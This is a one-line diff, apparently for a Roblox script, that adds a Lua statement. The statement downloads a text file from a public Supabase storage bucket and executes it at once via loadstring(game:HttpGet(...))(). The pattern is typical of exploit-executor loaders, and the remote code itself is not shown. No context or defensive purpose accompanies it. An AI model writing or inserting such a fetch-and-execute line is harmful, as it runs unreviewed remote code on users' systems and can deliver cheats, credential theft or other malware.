@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vcrewvgsdxykeoykxzxx.supabase.co/storage/v1/object/public/X86/avalon.txt"))()
